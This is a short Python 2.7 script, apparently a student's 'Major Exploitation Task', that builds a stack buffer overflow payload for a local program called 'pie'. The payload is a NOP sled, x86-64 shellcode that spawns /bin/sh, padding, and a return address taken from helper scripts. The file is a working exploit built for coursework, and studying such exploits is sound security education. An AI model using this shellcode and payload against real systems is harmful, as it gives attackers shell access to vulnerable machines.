# Taylor Smith - Major Exploitation Task
# Python 2.7

import subprocess
import sys

program = sys.argv[1] if len(sys.argv) > 1 else "pie"
overflow_size = int(subprocess.check_output(['python3', 'find_buffer.py', program]).strip())
nop_size = overflow_size-27-43

# Construct the exploit string (
nop_sled = "\x90" * nop_size
shellcode = "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"
padding = "\x41" * 43
return_address = "\x50\xe3\xff\xff\xff\x7f"

# Run return.py and capture its output
auto_return_address = subprocess.check_output(['python3', 'return.py', './pie']).strip()
#print(auto_return_address)
# Convert the hex string to bytes
auto_return_address = auto_return_address.decode('string_escape')


#exploit_string = nop_sled + shellcode + padding + return_address
exploit_string = nop_sled + shellcode + padding + auto_return_address
print exploit_string